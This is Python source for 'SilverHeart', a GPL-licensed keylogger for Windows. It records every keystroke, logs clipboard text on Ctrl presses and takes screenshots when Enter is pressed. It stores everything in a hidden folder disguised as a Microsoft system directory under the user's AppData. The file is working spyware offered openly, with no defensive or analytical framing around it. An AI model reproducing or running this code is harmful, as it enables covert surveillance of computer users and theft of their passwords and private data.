""" A software fully developed in Python 3.7, SilverHeart is a keylogger concept, that can be deployed in Windows. (Mac OS and Linux distributions support will be added soon).
    Copyright (C) 2020 Pedro Vieira

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>. 
"""

import logging
import os

from PIL import ImageGrab
from pynput import keyboard

import win32clipboard


Directory = 'C:\\Users\\' + \
    os.getlogin() + '\\AppData\\Roaming\\Microsoft\\SYSTEM.SWAV\\'


# capture class will create screenshots
class capture():
    n = 0

    try:
        os.makedirs(Directory + 'Am0ASk2', exist_ok=True)
    except OSError:
        pass

    def capture():

        # Set the logging info of the module PIL to INFO only because ImageGrab loggs by default
        pil_logger = logging.getLogger('PIL')
        pil_logger.setLevel(logging.INFO)

        # ---------------------------------------------------------------------------
        # Change 1.
        # Take a snapshot of the screen.
        # The pixels inside the bounding box are returned as an “RGB” image on Windows or “RGBA” on OS X.
        # If the bounding box is omitted, the entire screen is copied.
        # ---------------------------------------------------------------------------

        savePath = '{0}{1}{2}'.format(Directory + 'Am0ASk2\\screenshot',
                                      capture.n, '.png')

        # grabs screenshots (due to change 1. the images are now png)
        screenshot = ImageGrab.grab()
        screenshot.save(savePath)

        # stores the screenshots (due to change 1. the images are now png)
        if os.path.exists(savePath):
            capture.n += 1
            savePath = '{0}{1}{2}'.format(Directory + 'Am0ASk2\\screanshot',
                                          capture.n, '.png')
            screenshot = ImageGrab.grab()
            screenshot.save(savePath)
            os.remove(savePath)


class logger():
    def logger():
        logDir = os.path.join(Directory, "Keys.log")

        logging.basicConfig(filename=(logDir),
                            filemode="w",
                            format='%(asctime)s:%(message)s',
                            level=logging.DEBUG)

        def ctrl_V():

            # detects ctrl+v events
            win32clipboard.OpenClipboard()
            pastedValue = win32clipboard.GetClipboardData(1)
            win32clipboard.CloseClipboard()
            logging.warning('------------------')
            logging.warning('{0} {1}'.format('Ctrl-V pressed: ', pastedValue))
            logging.warning('------------------')

        def on_press(key):
            try:
                logging.warning('--->  {0}'.format(key.char))
            except AttributeError:
                logging.warning('--->  {0}'.format(key))

        def on_release(key):
            logging.warning('---> {0} released'.format(key))
            # Turns off keylogger
            if key == keyboard.Key.esc:
                return False
            if key == keyboard.Key.enter:
                capture.capture()
            if key == keyboard.Key.ctrl_l:
                # activate ctrl_V() only if clipboard content is text
                if win32clipboard.IsClipboardFormatAvailable(1) == 1:
                    ctrl_V()

        # Collect events until released
        with keyboard.Listener(on_press=on_press,
                               on_release=on_release) as listener:
            listener.join()
